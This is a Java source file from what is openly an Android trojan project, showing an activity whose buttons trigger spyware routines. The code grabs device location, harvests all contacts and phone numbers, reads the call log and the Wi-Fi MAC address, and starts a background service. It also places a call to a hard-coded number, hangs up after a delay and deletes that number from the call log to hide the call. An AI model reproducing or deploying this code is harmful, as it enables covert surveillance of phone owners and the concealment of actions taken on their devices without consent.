package trojan.android.android_trojan.Activity;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.util.Log;
import android.view.View;
import android.widget.Button;

import java.util.ArrayList;

import trojan.android.android_trojan.Action.BroadcastReceiver.PhoneStateReceiver;
import trojan.android.android_trojan.R;
import trojan.android.android_trojan.Action.Service.BackgroundService;
import trojan.android.android_trojan.Action.Tools;


public class SecondActivity extends Activity {
    private static final String TAG = "second_activity";
    private Button button21;
    private Button button22;
    private Button button23;
    private Button button24;
    private Button start_service;
    private Button stop_service;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.second_activity);
        button21 = (Button) findViewById(R.id.button21);
        button22 = (Button) findViewById(R.id.button22);
        button23 = (Button) findViewById(R.id.button23);
        button24 = (Button) findViewById(R.id.button24);
        start_service = (Button) findViewById(R.id.start_service);
        stop_service = (Button) findViewById(R.id.stop_service);

        button21.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                getLocation();
            }
        });
        button22.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                getContacts();
            }
        });
        button23.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                call("0628470850", 20000);
            }
        });
        button24.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                ArrayList<String[]> calllog = (ArrayList<String[]>) getCallLog();
            }
        });

        start_service.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                startService(new Intent(SecondActivity.this, BackgroundService.class));
            }
        });

        stop_service.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                stopService(new Intent(SecondActivity.this, BackgroundService.class));
            }
        });
    }

    public double[] getLocation() {
        //Get location manager
        LocationManager locManager = (LocationManager) getSystemService(LOCATION_SERVICE);
        //get the best provider to obtain the current location
        Location location = locManager.getLastKnownLocation(locManager.getBestProvider(new Criteria(), false));
        double[] result = new double[2];

        //try to get latitude and longitude
        try {
            result[0] = location.getAltitude();
            result[1] = location.getLongitude();
        } catch (Exception ex) {//if this failed the method return 0,0
            Log.d(TAG, ex.getMessage());
            result[0] = 0;
            result[1] = 0;
        }
        return result;
    }


    public ArrayList getContacts() {
        ContentResolver cr = getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);
        ArrayList<String[]> contacts = new ArrayList<String[]>();

        if (cur.getCount() > 0) {
            while (cur.moveToNext()) {
                String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                if (Integer.parseInt(cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        contacts.add(new String[]{name, phoneNo});
                    }
                    pCur.close();
                }
            }
        }
        return contacts;
    }

    public void call(String num, long time) {
        if (time > 1000) {
            Intent intent = new Intent(Intent.ACTION_CALL);
            intent.setData(Uri.parse("tel:" + num));
            startActivity(intent);
            Log.d(TAG, "Start call");
            PhoneStateReceiver test = new PhoneStateReceiver();
            Tools.sleep(time);
            test.onReceive(this.getApplicationContext(), intent);
            test.killCall(this.getApplicationContext());
            Log.d(TAG, "Stop call");
            Tools.sleep(1000);
            deleteCallLog(num);
        }
    }

    public ArrayList getCallLog() {
        ArrayList<String[]> callLog = new ArrayList<String[]>();
        String columns[] = new String[]{
                CallLog.Calls._ID,
                CallLog.Calls.NUMBER,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION,
                CallLog.Calls.TYPE};
        Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, columns, null, null, "Calls._ID DESC"); //last record first
        if (cursor.moveToFirst()) {
            do {
                callLog.add(new String[]{
                        cursor.getString(cursor.getColumnIndex(CallLog.Calls._ID)),
                        cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER)),
                        cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE)),
                        cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION)),
                        cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE)),
                });
            } while (cursor.moveToNext());
        }
        return callLog;
    }

    public void deleteCallLog(String num) {
        String strNumberOne[] = {num};
        Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, CallLog.Calls.NUMBER + " = ? ", strNumberOne, "");
        if (cursor.moveToFirst()) {
            do {
                int idOfRowToDelete = cursor.getInt(cursor.getColumnIndex(CallLog.Calls._ID));
                getContentResolver().delete(
                        CallLog.Calls.CONTENT_URI,
                        CallLog.Calls._ID + "= ? ",
                        new String[]{String.valueOf(idOfRowToDelete)});
            } while (cursor.moveToNext());
        }
    }

    public String getMacAddress() {
        WifiManager manager = (WifiManager) getSystemService(Context.WIFI_SERVICE);
        WifiInfo info = manager.getConnectionInfo();
        return info.getMacAddress();
    }
}
